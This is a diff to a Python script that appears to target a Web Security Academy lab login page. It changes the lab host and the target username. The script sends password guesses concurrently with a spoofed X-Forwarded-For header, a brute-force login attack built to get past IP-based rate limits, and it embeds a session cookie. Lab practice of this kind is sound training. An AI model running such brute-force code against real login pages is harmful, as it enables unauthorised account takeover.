@@ -3,14 +3,14 @@ import random
 import concurrent.futures
 
 
-url = 'https://0a3000ff049a85d38177a43d00cb001a.web-security-academy.net/login'
+url = 'https://0a24006103d7922d82c62e7400dc00c8.web-security-academy.net/login'
 
 headers = {
-    'Host': '0a3000ff049a85d38177a43d00cb001a.web-security-academy.net',
+    'Host': '0a24006103d7922d82c62e7400dc00c8.web-security-academy.net',
     'Cookie': 'session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx',
     'Content-Type': 'application/x-www-form-urlencoded',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
-    'Referer': 'https://0a3000ff049a85d38177a43d00cb001a.web-security-academy.net/login',
+    'Referer': 'https://0a24006103d7922d82c62e7400dc00c8.web-security-academy.net/login',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9',
     'X-Forwarded-For': 'avfbv§w§'
@@ -37,4 +37,4 @@ def send_request(username, password):
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
     for j in password:
-        executor.submit(send_request, "archie", j)
+        executor.submit(send_request, "ansible", j)
